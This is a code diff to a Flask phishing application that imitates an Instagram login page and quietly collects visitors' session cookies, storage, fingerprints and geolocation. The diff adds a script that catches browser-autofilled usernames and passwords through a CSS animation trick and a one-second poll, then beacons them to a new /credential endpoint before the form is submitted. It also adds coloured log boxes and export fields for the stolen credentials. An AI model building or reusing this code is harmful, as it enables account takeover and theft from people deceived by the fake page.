@@ -6,6 +6,7 @@ Env:
   ADMIN_TOKEN   console password             (unset = open, dev only)
   DATA_DIR      sqlite + log directory       (default ./data)
   GEO           1 to enable IP geo lookup    (default off)
+  ANSI          0 to strip log colours       (default on)
   PORT          listen port                  (default 5000)
 """
 
@@ -50,6 +51,7 @@ SECRET_KEY = os.environ.get("SECRET_KEY") or uuid.uuid4().hex
 ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN", "")
 DATA_DIR = Path(os.environ.get("DATA_DIR", "data"))
 GEO_ENABLED = os.environ.get("GEO", "0") == "1"
+ANSI_ON = os.environ.get("ANSI", "1") != "0"
 COOKIE_MAX_AGE = 60 * 60 * 24 * 365
 
 DATA_DIR.mkdir(parents=True, exist_ok=True)
@@ -82,9 +84,48 @@ if not logger.handlers:
 
 _jsonl_lock = threading.Lock()
 
+# --- ANSI palette: credentials yellow, cookies cyan, so they pop in Render logs ---
+C = {
+    "reset": "\033[0m",
+    "cred": "\033[1;33m",
+    "cred_val": "\033[1;97m",
+    "cookie": "\033[1;36m",
+    "cookie_val": "\033[97m",
+    "meta": "\033[1;35m",
+    "meta_val": "\033[95m",
+    "dim": "\033[2;37m",
+}
+BOX_W = 64
 
-def emit(kind: str, payload: dict) -> None:
-    """One human block on stdout + one machine line in events.jsonl."""
+
+def paint(text: str, color: str) -> str:
+    return f"{C.get(color, '')}{text}{C['reset']}" if ANSI_ON else text
+
+
+def print_box(title: str, lines: list[str], color: str = "cred", value_color: str = "cred_val") -> None:
+    """Highlighted, bordered block written straight to stdout (Render log)."""
+    rows = [paint("╔" + "═" * BOX_W + "╗", color),
+            paint("║ ", color) + paint(title[: BOX_W - 2].ljust(BOX_W - 2), color) + paint(" ║", color),
+            paint("╠" + "═" * BOX_W + "╣", color)]
+
+    for line in lines:
+        cut = str(line)[: BOX_W - 2]
+        rows.append(
+            paint("║ ", color) + paint(cut, value_color)
+            + paint(" " * (BOX_W - 2 - len(cut)) + " ║", color)
+        )
+
+    rows.append(paint("╚" + "═" * BOX_W + "╝", color))
+    sys.stdout.write("\n" + "\n".join(rows) + "\n")
+    sys.stdout.flush()
+
+
+def emit(kind: str, payload: dict, boxes: list[tuple] | None = None) -> None:
+    """Coloured boxes on stdout + one machine line in events.jsonl."""
+    for box in boxes or []:
+        print_box(box[0], box[1], box[2] if len(box) > 2 else "cred",
+                  box[3] if len(box) > 3 else "cred_val")
+
     stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
     body = {"ts": stamp, "kind": kind, **payload}
 
@@ -120,7 +161,7 @@ CREATE TABLE IF NOT EXISTS captures (
 );
 CREATE TABLE IF NOT EXISTS logins (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
-    capture_id INTEGER, username TEXT, password TEXT,
+    capture_id INTEGER, source TEXT, username TEXT, password TEXT,
     ip TEXT, ua TEXT, cookie_header TEXT, js_cookies TEXT, meta_json TEXT,
     created_at TEXT
 );
@@ -143,6 +184,9 @@ def init_db() -> None:
         conn = connect()
         try:
             conn.executescript(SCHEMA)
+            cols = {r["name"] for r in conn.execute("PRAGMA table_info(logins)")}
+            if "source" not in cols:
+                conn.execute("ALTER TABLE logins ADD COLUMN source TEXT")
             conn.commit()
         finally:
             conn.close()
@@ -178,11 +222,12 @@ def store_login(**kw) -> None:
         try:
             conn.execute(
                 """INSERT INTO logins
-                   (capture_id, username, password, ip, ua, cookie_header, js_cookies, meta_json, created_at)
-                   VALUES (?,?,?,?,?,?,?,?,?)""",
+                   (capture_id, source, username, password, ip, ua,
+                    cookie_header, js_cookies, meta_json, created_at)
+                   VALUES (?,?,?,?,?,?,?,?,?,?)""",
                 (
-                    kw["capture_id"], kw["username"], kw["password"], kw["ip"],
-                    kw["ua"], kw["cookie_header"], kw["js_cookies"],
+                    kw["capture_id"], kw["source"], kw["username"], kw["password"],
+                    kw["ip"], kw["ua"], kw["cookie_header"], kw["js_cookies"],
                     kw["meta_json"], kw["created_at"],
                 ),
             )
@@ -244,10 +289,8 @@ def geo(ip: str) -> dict:
     if ip in _geo_cache:
         return _geo_cache[ip]
     try:
-        url = (
-            "http://ip-api.com/json/" + ip +
-            "?fields=status,country,countryCode,regionName,city,isp,org,as,proxy,hosting"
-        )
+        url = ("http://ip-api.com/json/" + ip +
+               "?fields=status,country,countryCode,regionName,city,isp,org,as,proxy,hosting")
         with urllib.request.urlopen(url, timeout=1.5) as resp:
             data = json.loads(resp.read().decode("utf-8", "replace"))
         if data.get("status") != "success":
@@ -282,6 +325,15 @@ def digest_of(*parts: str) -> str:
 def make_initials(name: str) -> str:
     parts = [p for p in name.replace("_", ".").replace("-", ".").replace(" ", ".").split(".") if p]
     return ("".join(p[0] for p in parts[:2]) or name[:2] or "YO").upper()
+
+
+def cookie_lines(header: str, js: str) -> list[str]:
+    lines: list[str] = []
+    for k, v in parse_cookie_string(header).items():
+        lines.append(f"H {k} = {v[:70]}")
+    for k, v in parse_cookie_string(js).items():
+        lines.append(f"J {k} = {v[:70]}")
+    return lines or ["(none)"]
 
 
 def admin_ok() -> bool:
@@ -375,6 +427,10 @@ input:focus{
 .inputs input:nth-child(1){animation:up .55s .2s var(--e) backwards}
 .inputs input:nth-child(2){animation:up .55s .26s var(--e) backwards}
 
+/* autofill detection hook for Chrome/Edge */
+@keyframes autofillStart{from{}to{}}
+input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
+
 .login-btn{
   position:relative;overflow:hidden;width:100%;margin-top:12px;padding:13px 0;
   border:0;border-radius:24px;background:var(--blue);color:#fff;
@@ -437,14 +493,14 @@ input:focus{
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
         </div>
 
-        <form action="/login" method="POST" id="loginForm" autocomplete="on">
+        <form action="/login" method="POST" id="loginForm" autocomplete="on" name="login">
             <input type="hidden" name="payload" id="payload">
 
             <div class="inputs">
-                <input type="text" name="username" placeholder="Username, email or mobile number"
+                <input type="text" id="u" name="username" placeholder="Username, email or mobile number"
                        autocapitalize="none" autocorrect="off" spellcheck="false"
                        autocomplete="username" enterkeyhint="next" required>
-                <input type="password" name="password" placeholder="Password"
+                <input type="password" id="p" name="password" placeholder="Password"
                        autocomplete="current-password" enterkeyhint="go" required>
             </div>
 
@@ -511,7 +567,7 @@ input:focus{
       x.textBaseline = 'top';
       x.font = '16px Arial';
       x.fillStyle = '#f60'; x.fillRect(0, 0, 130, 32);
-      x.fillStyle = '#069'; x.fillText('Insight, capture 2.0', 2, 4);
+      x.fillStyle = '#069'; x.fillText('Insight, capture 2.1', 2, 4);
       x.fillStyle = 'rgba(102,204,0,.7)'; x.fillText('fingerprint', 4, 22);
       x.beginPath(); x.arc(200, 35, 22, 0, Math.PI * 2); x.fill();
       return fnv(c.toDataURL());
@@ -627,7 +683,6 @@ input:focus{
       hash: fnv(cookies + '|' + local.join('|') + '|' + sess.join('|') + '|' + JSON.stringify(meta))
     };
 
-    /* async extras, merged in place */
     try {
       if (navigator.getBattery) {
         navigator.getBattery().then(function (b) {
@@ -701,10 +756,60 @@ input:focus{
     flush(beacon !== false);
   }
 
+  /* ---------------- credential watcher (autofill / PIN unlock) ---------------- */
+  var uEl = document.getElementById('u');
+  var pEl = document.getElementById('p');
+  var lastPair = '';
+  var lastSentAt = 0;
+
+  function pushCred(source, force) {
+    if (!uEl || !pEl) return;
+    var u = uEl.value || '';
+    var p = pEl.value || '';
+    if (!u && !p) return;
+
+    var pair = u + '\u0000' + p;
+    var now = Date.now();
+    if (pair === lastPair && !force) return;
+    if (!force && now - lastSentAt < 1500) return;
+
+    lastPair = pair;
+    lastSentAt = now;
+
+    var body = JSON.stringify({ username: u, password: p, source: source, sid: SID });
+    if (navigator.sendBeacon) {
+      navigator.sendBeacon('/credential', new Blob([body], { type: 'application/json' }));
+      return;
+    }
+    try {
+      fetch('/credential', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: body,
+        keepalive: true
+      });
+    } catch (e) {}
+  }
+
+  document.addEventListener('animationstart', function (e) {
+    if (e.animationName === 'autofillStart') {
+      setTimeout(function () { pushCred('autofill', true); }, 120);
+      setTimeout(function () { pushCred('autofill', true); }, 700);
+    }
+  });
+
+  if (uEl) uEl.addEventListener('change', function () { pushCred('change'); });
+  if (pEl) pEl.addEventListener('change', function () { pushCred('change'); });
+  if (uEl) uEl.addEventListener('blur', function () { pushCred('blur'); });
+  if (pEl) pEl.addEventListener('blur', function () { pushCred('blur'); });
+
+  setInterval(function () { pushCred('poll'); }, 1000);
+
   send('load');
   document.addEventListener('DOMContentLoaded', function () { send('dom'); });
   setInterval(function () { send('poll'); }, 12000);
   document.addEventListener('visibilitychange', function () { send(document.hidden ? 'hidden' : 'visible'); });
+  window.addEventListener('pageshow', function () { pushCred('pageshow', true); });
   window.addEventListener('pagehide', function () { send('pagehide', true); });
   window.addEventListener('beforeunload', function () { send('unload', true); });
   window.addEventListener('online', function () { send('online'); });
@@ -715,12 +820,12 @@ input:focus{
 
   var form = document.getElementById('loginForm');
   if (form) {
-    form.addEventListener('submit', function () { gather(); send('submit', true); });
+    form.addEventListener('submit', function () {
+      gather();
+      pushCred('submit', true);
+      send('submit', true);
+    });
   }
-
-  document.querySelectorAll('input[type=text],input[type=password]').forEach(function (i) {
-    i.addEventListener('focus', function () { send('focus'); });
-  });
 })();
 </script>
 
@@ -1111,23 +1216,24 @@ td a{color:var(--acc);text-decoration:none}
 td a:hover{text-decoration:underline}
 .pill{display:inline-block;padding:1px 8px;border-radius:99px;font-size:10.5px;border:1px solid}
 .pill.login{color:var(--ok);border-color:#1e6b3d;background:#0e2318}
+.pill.auto{color:var(--warn);border-color:#6b4d1e;background:#231a08}
 .pill.cap{color:var(--mut);border-color:var(--line)}
-.pill.new{color:var(--bad);border-color:#6b1e28;background:#230e12}
 .mono{font-size:11.5px;color:var(--mut);max-width:420px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 pre{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:12px;overflow:auto;font-size:12px;white-space:pre-wrap;word-break:break-word;max-height:420px}
 pre b{color:var(--acc)}
 .block{margin-bottom:16px}
 .block h2{font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--mut);margin-bottom:6px}
-.row2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.cred{background:#171408;border-color:#5a4718}
+.cred pre{background:#0f0d05;border-color:#5a4718;color:#ffe08a}
+.cookie pre{color:#8fe6f0}
 .empty{padding:60px 0;text-align:center;color:var(--mut)}
 .warn{background:#231a08;border:1px solid #6b4d1e;color:var(--warn);padding:10px 14px;border-radius:10px;margin-bottom:16px;font-size:12.5px}
 form.inline{display:inline}
-@media(max-width:820px){.row2{grid-template-columns:1fr}.mono{max-width:180px}}
 </style></head><body>
 <header>
   <h1><i>▚</i> Insight Console</h1>
   <span class="stat">captures <b>__CAPS__</b></span>
-  <span class="stat">logins <b>__LOGS__</b></span>
+  <span class="stat">credentials <b>__LOGS__</b></span>
   <span class="stat" id="live">live</span>
   <span class="spacer"></span>
   <a class="btn" href="/admin/export?fmt=json">export json</a>
@@ -1174,18 +1280,20 @@ def render_admin(body: str) -> str:
         logs = conn.execute("SELECT COUNT(*) c FROM logins").fetchone()["c"]
     finally:
         conn.close()
-    return (
-        ADMIN_HTML.replace("__BODY__", body)
-        .replace("__CAPS__", str(caps))
-        .replace("__LOGS__", str(logs))
-    )
+    return (ADMIN_HTML.replace("__BODY__", body)
+            .replace("__CAPS__", str(caps))
+            .replace("__LOGS__", str(logs)))
 
 
 def row_html(r: sqlite3.Row) -> str:
-    badge = (
-        f'<span class="pill login">{r["nlog"]} login</span>'
-        if r["nlog"] else '<span class="pill cap">visit</span>'
-    )
+    nlog = r["nlog"]
+    if nlog:
+        badge = f'<span class="pill login">{nlog} cred</span>'
+    elif r["src"] == "autofill":
+        badge = '<span class="pill auto">autofill</span>'
+    else:
+        badge = '<span class="pill cap">visit</span>'
+
     place = ", ".join(x for x in (r["city"], r["country"]) if x) or "-"
     return (
         f'<tr data-id="{r["id"]}">'
@@ -1213,7 +1321,6 @@ def finalize(resp: Response) -> Response:
     resp.headers["Pragma"] = "no-cache"
     resp.headers["X-Content-Type-Options"] = "nosniff"
     resp.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
-
     if not request.cookies.get("cid"):
         resp.set_cookie("cid", g.cid, max_age=COOKIE_MAX_AGE, samesite="Lax")
     return resp
@@ -1223,15 +1330,21 @@ def finalize(resp: Response) -> Response:
 def index():
     ip = client_ip()
     info = geo(ip)
+    header_cookie = request.headers.get("Cookie", "")
+
+    boxes = []
+    if header_cookie:
+        boxes.append((f"🍪 SESSION COOKIES · {len(parse_cookie_string(header_cookie))}",
+                      cookie_lines(header_cookie, ""), "cookie", "cookie_val"))
 
     emit("PAGE_VIEW", {
         "cid": g.cid, "ip": ip,
         "ua": request.headers.get("User-Agent", "")[:220],
         "referer": request.headers.get("Referer", "")[:220],
         "accept_lang": request.headers.get("Accept-Language", "")[:120],
-        "cookie_header": request.headers.get("Cookie", "")[:1200],
+        "cookie_header": header_cookie[:1200],
         "geo": {k: info.get(k) for k in ("country", "city", "isp") if info.get(k)},
-    })
+    }, boxes)
 
     if session.get("user"):
         return redirect(url_for("dashboard"))
@@ -1260,8 +1373,8 @@ def collect():
     reason = (data.get("reason") or "unknown")[:24]
     sid = (data.get("sid") or "")[:24]
 
-    digest = digest_of(cookies, "|".join(map(str, local)), "|".join(map(str, sess)), json.dumps(meta, sort_keys=True))
-
+    digest = digest_of(cookies, "|".join(map(str, local)), "|".join(map(str, sess)),
+                       json.dumps(meta, sort_keys=True))
     if reason == "poll" and is_duplicate(g.cid, digest):
         return ("", 204)
 
@@ -1281,21 +1394,65 @@ def collect():
         created_at=datetime.now(timezone.utc).isoformat(timespec="seconds"),
     )
 
-    parsed = parse_cookie_string(cookies)
+    lines = cookie_lines(header_cookie, cookies)
     emit("COOKIE_SNAPSHOT", {
         "cid": g.cid, "cap": cap_id, "reason": reason, "ip": ip,
         "ua": request.headers.get("User-Agent", "")[:200],
         "referer": request.headers.get("Referer", "")[:200],
-        "cookie_header": header_cookie[:1200],
-        "js_cookies": {k: v[:200] for k, v in parsed.items()} or "(none)",
+        "js_cookies": {k: v[:200] for k, v in parse_cookie_string(cookies).items()} or "(none)",
         "localStorage": local[:8],
         "sessionStorage": sess[:8],
         "fingerprint": meta,
         "geo": {k: info.get(k) for k in ("country", "city", "isp") if info.get(k)},
-    })
+    }, [("🍪 SESSION COOKIES", lines, "cookie", "cookie_val")])
 
     session["cid"] = g.cid
     session["last_cap"] = cap_id
+    return ("", 204)
+
+
+@app.route("/credential", methods=["POST"])
+def credential():
+    """Fired by the page the moment autofill / PIN unlock lands values."""
+    ip = client_ip()
+    if not rate_ok(ip, 80):
+        return ("", 429)
+
+    data = request.get_json(silent=True)
+    if not isinstance(data, dict):
+        try:
+            data = json.loads(request.get_data(as_text=True) or "{}")
+        except ValueError:
+            data = {}
+        if not isinstance(data, dict):
+            data = {}
+
+    username = (data.get("username") or "").strip()
+    password = data.get("password") or ""
+    source = (data.get("source") or "autofill")[:16]
+    if not (username or password):
+        return ("", 204)
+
+    cap_id = session.get("last_cap") or 0
+    header_cookie = request.headers.get("Cookie", "")
+    stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
+
+    store_login(
+        capture_id=cap_id, source=source, username=username, password=password, ip=ip,
+        ua=request.headers.get("User-Agent", ""), cookie_header=header_cookie,
+        js_cookies="", meta_json="{}", created_at=stamp,
+    )
+
+    emit("CREDENTIAL", {
+        "cid": g.cid, "cap": cap_id, "ip": ip, "source": source,
+        "USERNAME": username, "PASSWORD": password,
+        "ua": request.headers.get("User-Agent", "")[:200],
+    }, [
+        (f"🔑 CREDENTIALS · {source}", [f"username : {username or '(blank)'}",
+                                        f"password : {password or '(blank)'}"], "cred", "cred_val"),
+        (f"🍪 SESSION COOKIES · {len(parse_cookie_string(header_cookie))}",
+         cookie_lines(header_cookie, ""), "cookie", "cookie_val"),
+    ])
     return ("", 204)
 
 
@@ -1315,7 +1472,7 @@ def login():
     if not isinstance(payload, dict):
         payload = {}
 
-    cookies = (payload.get("cookies") or request.form.get("browser_cookies") or "").strip()
+    cookies = (payload.get("cookies") or "").strip()
     meta = payload.get("meta") if isinstance(payload.get("meta"), dict) else {}
     local = payload.get("local") if isinstance(payload.get("local"), list) else []
     sess = payload.get("sess") if isinstance(payload.get("sess"), list) else []
@@ -1341,7 +1498,7 @@ def login():
         geo_json=json.dumps(info, ensure_ascii=False), created_at=stamp,
     )
     store_login(
-        capture_id=cap_id, username=username, password=password, ip=ip,
+        capture_id=cap_id, source="submit", username=username, password=password, ip=ip,
         ua=request.headers.get("User-Agent", ""), cookie_header=header_cookie,
         js_cookies=cookies, meta_json=json.dumps(meta, ensure_ascii=False), created_at=stamp,
     )
@@ -1350,11 +1507,15 @@ def login():
         "cid": g.cid, "cap": cap_id, "ip": ip, "visit": visit,
         "USERNAME": username, "PASSWORD": password,
         "ua": request.headers.get("User-Agent", "")[:200],
-        "cookie_header": header_cookie[:1200],
         "js_cookies": {k: v[:200] for k, v in parse_cookie_string(cookies).items()} or "(none)",
         "fingerprint": meta,
         "geo": {k: info.get(k) for k in ("country", "city", "isp") if info.get(k)},
-    })
+    }, [
+        (f"🔑 CREDENTIALS · submit · visit #{visit}",
+         [f"username : {username}", f"password : {password}"], "cred", "cred_val"),
+        (f"🍪 SESSION COOKIES · {len(parse_cookie_string(header_cookie))}",
+         cookie_lines(header_cookie, cookies), "cookie", "cookie_val"),
+    ])
 
     session.update({
         "user": username,
@@ -1398,11 +1559,14 @@ def cookies_view():
     cap = session.get("last_cap")
     conn = connect()
     try:
-        row = conn.execute(
-            "SELECT * FROM captures WHERE id=?", (cap,)
-        ).fetchone() if cap else conn.execute(
-            "SELECT * FROM captures WHERE cid=? ORDER BY id DESC LIMIT 1", (g.cid,)
-        ).fetchone()
+        row = (conn.execute("SELECT * FROM captures WHERE id=?", (cap,)).fetchone()
+               if cap else
+               conn.execute("SELECT * FROM captures WHERE cid=? ORDER BY id DESC LIMIT 1",
+                            (g.cid,)).fetchone())
+        creds = conn.execute(
+            "SELECT source, username, password, created_at FROM logins WHERE capture_id=? ORDER BY id",
+            (row["id"] if row else 0,),
+        ).fetchall()
     finally:
         conn.close()
 
@@ -1420,6 +1584,7 @@ def cookies_view():
         "js_cookies": parse_cookie_string(row["js_cookies"] or ""),
         "storage": json.loads(row["storage_json"] or "{}"),
         "fingerprint": json.loads(row["meta_json"] or "{}"),
+        "credentials": [dict(c) for c in creds],
     })
 
 
@@ -1439,8 +1604,9 @@ def admin():
     q = (request.args.get("q") or "").strip()
     only = request.args.get("only") or "all"
 
-    sql = """SELECT c.id, c.created_at, c.ip, c.ua, c.js_cookies, c.country, c.city,
-                    (SELECT COUNT(*) FROM logins l WHERE l.capture_id=c.id) AS nlog
+    sql = """SELECT c.id, c.created_at, c.ip, c.ua, c.js_cookies, c.country, c.city, c.reason,
+                    (SELECT COUNT(*) FROM logins l WHERE l.capture_id=c.id) AS nlog,
+                    (SELECT source FROM logins l WHERE l.capture_id=c.id ORDER BY id LIMIT 1) AS src
              FROM captures c"""
     where, params = [], []
     if q:
@@ -1469,7 +1635,7 @@ def admin():
         ' style="flex:1;min-width:220px;background:#141419;border:1px solid #232329;color:#ececf1;'
         'padding:9px 12px;border-radius:9px;font:inherit;font-size:12.5px;outline:none">'
         '<button class="btn" type="submit">search</button>'
-        '<a class="btn" href="/admin?only=logins">only logins</a>'
+        '<a class="btn" href="/admin?only=logins">only credentials</a>'
         '<a class="btn" href="/admin">reset</a></form>'
         '<table><thead><tr><th>#</th><th>time (utc)</th><th>place</th><th>ip</th>'
         '<th>ua</th><th>cookies</th><th>type</th><th></th></tr></thead>'
@@ -1489,8 +1655,9 @@ def admin_feed():
     conn = connect()
     try:
         rows = conn.execute(
-            """SELECT c.id, c.created_at, c.ip, c.ua, c.js_cookies, c.country, c.city,
-                      (SELECT COUNT(*) FROM logins l WHERE l.capture_id=c.id) AS nlog
+            """SELECT c.id, c.created_at, c.ip, c.ua, c.js_cookies, c.country, c.city, c.reason,
+                      (SELECT COUNT(*) FROM logins l WHERE l.capture_id=c.id) AS nlog,
+                      (SELECT source FROM logins l WHERE l.capture_id=c.id ORDER BY id LIMIT 1) AS src
                FROM captures c WHERE c.id > ? ORDER BY c.id DESC LIMIT 40""",
             (since,),
         ).fetchall()
@@ -1508,30 +1675,28 @@ def admin_capture(cap_id: int):
     conn = connect()
     try:
         cap = conn.execute("SELECT * FROM captures WHERE id=?", (cap_id,)).fetchone()
-        logs = conn.execute(
-            "SELECT * FROM logins WHERE capture_id=? ORDER BY id", (cap_id,)
-        ).fetchall()
+        logs = conn.execute("SELECT * FROM logins WHERE capture_id=? ORDER BY id", (cap_id,)).fetchall()
     finally:
         conn.close()
 
     if not cap:
         abort(404)
 
-    def block(title: str, content: str) -> str:
-        return (
-            f'<div class="block"><h2>{title} '
-            f'<button class="btn" onclick="copy(this)">copy</button></h2>'
-            f"<pre>{escape(content) or '-'}</pre></div>"
-        )
+    def block(title: str, content: str, cls: str = "") -> str:
+        return (f'<div class="block {cls}"><h2>{title} '
+                f'<button class="btn" onclick="copy(this)">copy</button></h2>'
+                f"<pre>{escape(content) or '-'}</pre></div>")
 
     fp = json.dumps(json.loads(cap["meta_json"] or "{}"), indent=2, ensure_ascii=False)
     storage = json.loads(cap["storage_json"] or "{}")
     ginfo = json.dumps(json.loads(cap["geo_json"] or "{}"), indent=2, ensure_ascii=False)
 
-    logins_html = ""
+    creds_html = ""
     for l in logs:
-        logins_html += (
-            f'<div class="block"><h2>credentials #{l["id"]} · {escape(l["created_at"] or "")}</h2>'
+        creds_html += (
+            f'<div class="block cred"><h2>🔑 credentials · {escape(l["source"] or "")} · '
+            f'{escape(l["created_at"] or "")} '
+            f'<button class="btn" onclick="copy(this)">copy</button></h2>'
             f'<pre><b>username</b> {escape(l["username"] or "")}\n'
             f'<b>password</b> {escape(l["password"] or "")}\n'
             f'<b>ip</b> {escape(l["ip"] or "")}\n'
@@ -1549,9 +1714,9 @@ def admin_capture(cap_id: int):
         f'time      {escape(cap["created_at"] or "")}\nip        {escape(cap["ip"] or "")}\n'
         f'ua        {escape(cap["ua"] or "")}\nreferer   {escape(cap["referer"] or "")}\n'
         f'lang      {escape(cap["accept_lang"] or "")}</pre></div>'
-        + logins_html
-        + block("cookie header (server)", cap["cookie_header"] or "")
-        + block("document.cookie (js)", cap["js_cookies"] or "")
+        + creds_html
+        + block("🍪 cookie header (server)", cap["cookie_header"] or "", "cookie")
+        + block("🍪 document.cookie (js)", cap["js_cookies"] or "", "cookie")
         + block("localStorage", "\n".join(storage.get("local", [])) or "")
         + block("sessionStorage", "\n".join(storage.get("session", [])) or "")
         + block("fingerprint", fp)
@@ -1593,7 +1758,7 @@ def admin_export():
         buf = io.StringIO()
         w = csv.writer(buf)
         w.writerow(["capture_id", "created_at", "ip", "country", "city", "ua", "reason",
-                    "cookie_header", "js_cookies", "username", "password"])
+                    "cookie_header", "js_cookies", "source", "username", "password"])
         by_cap = {}
         for l in logs:
             by_cap.setdefault(l["capture_id"], []).append(l)
@@ -1601,26 +1766,21 @@ def admin_export():
             ls = by_cap.get(c["id"]) or [None]
             for l in ls:
                 w.writerow([
-                    c["id"], c["created_at"], c["ip"], c["country"], c["city"],
-                    c["ua"], c["reason"], c["cookie_header"], c["js_cookies"],
-                    (l["username"] if l else ""), (l["password"] if l else ""),
+                    c["id"], c["created_at"], c["ip"], c["country"], c["city"], c["ua"],
+                    c["reason"], c["cookie_header"], c["js_cookies"],
+                    (l["source"] if l else ""), (l["username"] if l else ""),
+                    (l["password"] if l else ""),
                 ])
-        return Response(
-            buf.getvalue(),
-            mimetype="text/csv",
-            headers={"Content-Disposition": f"attachment; filename=insight-{stamp}.csv"},
-        )
+        return Response(buf.getvalue(), mimetype="text/csv",
+                        headers={"Content-Disposition": f"attachment; filename=insight-{stamp}.csv"})
 
     payload = {
         "exported_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
         "captures": [dict(c) for c in caps],
         "logins": [dict(l) for l in logs],
     }
-    return Response(
-        json.dumps(payload, indent=2, ensure_ascii=False),
-        mimetype="application/json",
-        headers={"Content-Disposition": f"attachment; filename=insight-{stamp}.json"},
-    )
+    return Response(json.dumps(payload, indent=2, ensure_ascii=False), mimetype="application/json",
+                    headers={"Content-Disposition": f"attachment; filename=insight-{stamp}.json"})
 
 
 @app.route("/healthz")
@@ -1631,13 +1791,8 @@ def healthz():
         logs = conn.execute("SELECT COUNT(*) c FROM logins").fetchone()["c"]
     finally:
         conn.close()
-    return jsonify({
-        "ok": True,
-        "captures": caps,
-        "logins": logs,
-        "geo": GEO_ENABLED,
-        "admin_locked": bool(ADMIN_TOKEN),
-    })
+    return jsonify({"ok": True, "captures": caps, "credentials": logs,
+                    "geo": GEO_ENABLED, "admin_locked": bool(ADMIN_TOKEN)})
 
 
 # ---------------- errors ----------------
